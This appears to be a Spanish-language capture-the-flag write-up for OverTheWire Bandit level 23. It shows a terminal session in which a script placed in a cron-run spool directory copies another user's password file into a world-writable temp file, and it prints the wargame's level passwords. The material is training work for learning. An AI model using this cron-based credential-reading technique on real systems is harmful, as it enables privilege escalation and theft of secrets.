## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos Acceso 
Server :  ssh bandit23@bandit.labs.overthewire.org -p 2220
Password : 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
## Comandos

- **`chmod`**:
    
    - `chmod` es un comando que se usa para cambiar los permisos de acceso a archivos y directorios.
- **`666`**:
    
    - Este es un valor en octal que especifica los permisos para el archivo. Los permisos están representados por tres números, cada uno de los cuales puede tener un valor de 0 a 7. Cada dígito representa los permisos para el usuario, el grupo y otros, respectivamente.
    - El número `666` se descompone de la siguiente manera:
        - El primer `6` representa los permisos para el propietario del archivo.
        - El segundo `6` representa los permisos para el grupo del archivo.
        - El tercer `6` representa los permisos para todos los demás usuarios.
    - El número `6` en octal es una combinación de permisos de lectura (`4`) y escritura (`2`), lo que significa que el archivo tendrá permisos de lectura y escritura para todos.
## Codigo 
```
bandit23@bandit:~$ cd /tmp/kd
bandit23@bandit:/tmp/kd$ echo "cat /etc/bandit_pass/bandit24 >
/tmp/kd/password" > script.sh
bandit23@bandit:/tmp/kd$ cat script.sh
cat /etc/bandit_pass/bandit24 >
/tmp/kd/password
bandit23@bandit:/tmp/kd$ chmod +x script.sh
bandit23@bandit:/tmp/kd$ touch password
bandit23@bandit:/tmp/kd$ chmod 666 password
bandit23@bandit:/tmp/kd$ ls –la
ls: cannot access '–la': No such file or directory
bandit23@bandit:/tmp/kd$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/kd$ ls -la
total 10868
drwxrwxrwx   2 bandit23 bandit23     4096 Sep 14 02:25 .
drwxrwx-wt 500 root     root     11116544 Sep 14 02:26 ..
-rw-rw-rw-   1 bandit23 bandit23        0 Sep 14 02:25 password
-rwxrwxr-x   1 bandit23 bandit23       49 Sep 14 02:25 script.sh
bandit23@bandit:/tmp/kd$ date
Sat Sep 14 02:26:36 AM UTC 2024
bandit23@bandit:/tmp/kd$ ls -la
total 10868
drwxrwxrwx   2 bandit23 bandit23     4096 Sep 14 02:25 .
drwxrwx-wt 500 root     root     11116544 Sep 14 02:26 ..
-rw-rw-rw-   1 bandit23 bandit23        0 Sep 14 02:25 password
-rwxrwxr-x   1 bandit23 bandit23       49 Sep 14 02:25 script.sh
bandit23@bandit:/tmp/kd$ cat password
```

## Solución
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8